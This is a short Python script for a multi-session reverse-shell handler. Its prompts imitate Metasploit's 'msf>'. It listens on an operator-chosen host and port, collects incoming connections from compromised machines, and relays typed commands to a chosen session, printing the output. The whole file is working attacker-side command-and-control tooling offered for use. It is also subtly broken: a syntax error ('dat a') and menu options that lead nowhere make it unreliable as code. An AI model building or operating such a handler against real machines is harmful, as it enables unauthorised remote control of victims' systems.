import socket
import os
import subprocess
import sys
import threading
import time

t=threading
sub=subprocess
allcon=[]
alladdr=[]

def create():
    global host
    global port
    global s
    s=socket.socket()
    time.sleep(2.4)
    host=input("set lhost>")
    time.sleep(2.0)
    port=int(input("set lport>"))
def bind():
    s.bind((host,port))
def listen():
    s.listen(10)
    print("listen to exploit----->")
    time.sleep(2.4)
    print ("listen to exploit------->")
    time.sleep(3.0)
    print("exploit----------------------------->",host,port)
def accept():
    global c
    global addr
    counter=0
    while counter < 5:
        try:
            
            (c,(addr)) = s.accept()
            allcon.append(c)
            alladdr.append(addr)
            print("session connected---->",len(allcon),alladdr[:])
            counter+=1
            
        except KeyboardInterrupt:
            select()


def select():
    x=input("select shell>")
    if x=='list':
        list1()
        select()
    elif x=='help()':
         print("press list")
         print("press select target>num")
         select()
    elif x=='listen':
         print("listen to exploit")
         accept()
    else:
        w=int(x)
        y=allcon[w]
        print(y)
        shell(y)
        
    
def shell(y):
    while True:
        try:
            data=input("msf>")
            if data=='quit':
                sys.exit()
            elif data=='main':
                 main()
            elif data=='select target':
                 select()
            elif dat a=='help()':
                 help()
                 shell(y)
            elif data=='list1':
                 list1()
            else:
                y.send(data.encode()) 

                output = y.recv(99999).decode()
                print(output)

        except socket.error as msg:
            sys.exit()

def help():
    print("welcome to shell>")
    print("press list1")
    print("press manu")
    print("press select target")
    print("press background")
    print("press quit")
    
def list1():
    print("all session --->",len(allcon),alladdr[:])


def main():
    x=input("msf>")
    if x=='shell':
        create()
        bind()
        listen()
        accept()
        select()
    elif x=='exit':
         sys.exit()
        
    else:
        print("wrong")
        main()




main()
